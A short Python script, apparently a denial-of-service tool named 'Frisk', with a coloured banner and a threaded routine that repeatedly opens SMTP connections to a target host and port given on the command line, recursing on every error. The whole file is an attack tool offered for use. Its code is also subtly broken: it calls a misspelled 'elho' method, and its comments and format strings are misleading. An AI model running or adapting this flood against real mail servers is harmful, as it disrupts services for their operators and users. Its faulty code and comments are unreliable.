#!/usr/bin/python3
import smtplib,sys,time,os,random
from threading import Thread
color = random.choice(["\033[31m","\033[32m","\033[33m","\033[34m","\033[35m","\033[36m"])
print("\033[32m                     \033[40m ___                                         ___ \033[49m")
print("\033[31m                     \033[40m|/         |||||||||||||  ||| ||||||  |||  |||  |\033[49m")
print("\033[32m                     \033[40m|         ||     |||=||| ||| ||||||  ||| |||    |\033[49m")
print("\033[33m                     \033[40m|        |||||  ||||||      |||     |||||       |\033[49m")
print("\033[34m                     \033[40m|       ||     ||||||  ||| ||||||  |||||        |\033[49m")
print("\033[35m                     \033[40m|      ||     ||| ||| |||    |||  ||| |||       |\033[49m")
print("\033[36m                     \033[40m|     ||     |||  |||||| ||||||  |||  |||       |\033[49m")
print("\033[31m                     \033[40m|___ ||     |||  |||||| ||||||  |||  |||     ___|\033[49m")
print("\033[40m\033[31m")
print(" ")
print("\033[40m\033[32m[---]                <(OUR SITE IS CURRENTLY UNDER FRISK ATTACK)>           [---]\033[49m")
print(color)
time.sleep(2)
try:
	os.system("clear")
except:
	os.system("cls")
def attack(host, port):
 #Print The Server And Port Creads
 try:
     for x in range(int(sys.argv[3])):
        #We Wait for 1 Sec
        time.sleep(1)
        #This Is Where We Request SMTP
        s = smtplib.SMTP(host, port)
        #Phase 2
        s.elho()
        #If Phase To Was A Success This Means Server Uses SMTP
        s.starttls()
        #We Tell The Client That The Server Rejected Which Means That It uses SMTP
        print("- Server Rejected Frisk Packet",time.ctime(),"".format(host, port))
 except:
     attack(sys.argv[1],sys.argv[2])
def Main():
    try:
        for alex in range(int(sys.argv[3])):
            f1 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f2 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f3 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f4 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f5 = Thread(target=attack, args=(sys.argv[1],sys.argv[2]))
            f1.start()
            f2.start()
            f3.start()
            f4.start()
            f5.start()
    except RuntimeError as error:
        print(time.ctime(),"+ SENT FRISK CURRENTLY ATTACKING".format(sys.argv[1], sys.argv[2]))
if __name__ == "__main__":
   # while True:
    #    try:
     #       while True:
      #          main()
       # except:
        #        main()
    Main()



